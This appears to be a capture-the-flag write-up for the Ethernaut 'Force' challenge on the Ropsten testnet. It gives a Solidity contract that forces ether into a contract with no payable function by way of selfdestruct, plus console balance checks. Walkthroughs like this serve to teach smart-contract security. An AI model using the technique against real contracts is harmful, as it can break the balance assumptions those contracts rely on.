force 

// contract has no logic built in it; empty contract

// this does NOT mean that contract cannot have a balance > 0!

// though contract is not explicitly payable, contract CAN still receive funds via the recipient of a selfdestruct being called on another function


*contracts attacking contracts*

```javascript
instance // => returns contract address (Ropsten)
await getBalance(instance) // => returns 0 indicating the contract holds no funds at the moment
```

---

to Remix!

---

create new contract! (CAUTION: disposable code ahead..)

```solidity
pragma solidity ^0.4.15;

contract ForceEth {
	// create state variable for readability
	address private forceContract; 

	// constructor
	// insert contract address as constructor argument (returned from calling 'instance' in JS console above)
	function ForceEth(address _addr) public payable {
		forceContract = _addr;
	}

	function kill() public {
		// pass in forceContract state variable as argument for suicide
		selfdestruct(forceContract); // selfdestruct => alias for suicide
	}

	function() payable { }
}
```

- deploy using injectedWeb3 enviro - Ropsten - (passing in some eth amount to value, and address of ethernaut 'Force' contract instance)
- once contract successfully deployed, kill it!

---

back to the console!

---

```javascript
await getBalance(instance) // => returns whatever amount of eth you passed in when deploying the ForceEth contract
```
